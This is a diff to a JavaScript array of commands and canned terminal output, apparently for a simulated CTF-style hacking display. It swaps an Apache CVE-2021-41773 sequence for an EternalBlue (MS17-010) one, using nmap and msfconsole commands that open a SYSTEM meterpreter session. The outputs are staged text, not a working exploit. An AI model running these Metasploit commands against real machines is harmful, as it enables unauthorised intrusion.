@@ -22,26 +22,32 @@ const COMMANDS = [
     ],
   },
   {
-    cmd: 'nmap -sV --open 10.0.1.1',
+    cmd: 'nmap -sV --open 10.0.1.20',
     out: [
-      'PORT    STATE SERVICE  VERSION',
-      '22/tcp  open  ssh      OpenSSH 8.9p1',
-      '80/tcp  open  http     Apache 2.4.52',
-      '[!] CVE-2021-41773 detected on :80',
+      'PORT    STATE SERVICE      VERSION',
+      '445/tcp open  microsoft-ds Windows 7/10 (workgroup: WORKGROUP)',
+      '[!] alvo provavel vulneravel a MS17-010 (EternalBlue)',
     ],
   },
   {
-    cmd: 'python3 exploit.py --target 10.0.1.1',
+    cmd: 'msfconsole -x "search ms17_010;use 0"',
     out: [
-      '[*] sending payload...',
-      '[+] RCE confirmed',
-      '[+] uid=0(root) gid=0(root) groups=0(root)',
+      '1  exploit/windows/smb/ms17_010_eternalblue  average',
+      '2  exploit/windows/smb/ms17_010_psexec       normal',
+    ],
+  },
+  {
+    cmd: 'set RHOSTS 10.0.1.20;set LHOST 10.0.1.5;run',
+    out: [
+      '[+] alvo VULNERAVEL — Windows 7 SP1 x64',
+      '[*] corrompendo pool nao-paginado... enviando payload',
+      '[+] sessao meterpreter aberta -> nt authority\\system',
     ],
   },
   {
     cmd: 'cat /flag.txt',
     out: [
-      '[+] flag{y4m1_w4s_h3r3_4nd_l3ft_n0_tr4c3}',
+      '[+] flag{um_d1a_4pos_0_0utr0_t3nt4nd0}',
     ],
   },
 ];
